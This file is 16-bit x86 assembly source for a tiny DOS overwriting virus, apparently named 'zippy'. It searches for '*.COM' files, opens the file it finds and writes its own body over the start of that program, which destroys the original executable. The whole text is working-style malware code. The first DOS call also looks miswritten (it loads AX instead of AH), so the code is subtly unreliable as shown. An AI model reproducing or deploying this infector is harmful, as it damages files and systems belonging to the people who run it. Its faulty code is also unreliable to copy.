    .intel_syntax noprefix
    .code16
    .text
    .org 0x100

zippy:
    mov ax,0x4E
    xor cx,cx
    lea dx,[comfile]
    int 0x21
    mov ax,0x3D01
    mov dx,0x9E
    int 0x21
    xchg bx,ax
    mov ah,0x40
    mov dx,si
    mov cx,virend-zippy
    int 0x21
    ret

comfile:
    .asciz "*.COM"

virend:
